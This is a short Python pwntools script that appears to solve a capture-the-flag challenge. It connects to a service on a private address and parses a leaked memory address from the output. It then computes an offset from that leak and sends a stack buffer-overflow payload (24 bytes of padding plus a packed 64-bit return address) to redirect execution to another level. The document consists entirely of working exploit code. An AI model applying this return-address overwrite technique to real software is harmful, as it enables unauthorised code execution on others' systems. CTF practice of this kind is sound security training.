from pwn import *
import re
import time
target = remote("10.110.2.100", 5000)

print(target.recv())
time.sleep(0.1)
target.sendline(b'Team1')
print(target.recv())
time.sleep(0.1)
target.sendline(b'3')
time.sleep(0.1)
s = target.recv()
print(s)
s = re.findall("is at (.*?): ",str(s))
print(s)
lvl9addr = flat(hex(int(s[0], 16) - 0x18D))
time.sleep(0.1)
target.sendline(lvl9addr)
time.sleep(0.1)
print(target.recv())

'''Level 8 part'''
time.sleep(0.1)
target.sendline(b'8')
print(target.recv())

payload = b'a' * 24
payload += p64(int(s[0], 16) - 0x18D)
print(payload)
time.sleep(0.1)
target.sendline(payload)
time.sleep(0.1)
print(target.recv())
target.close()
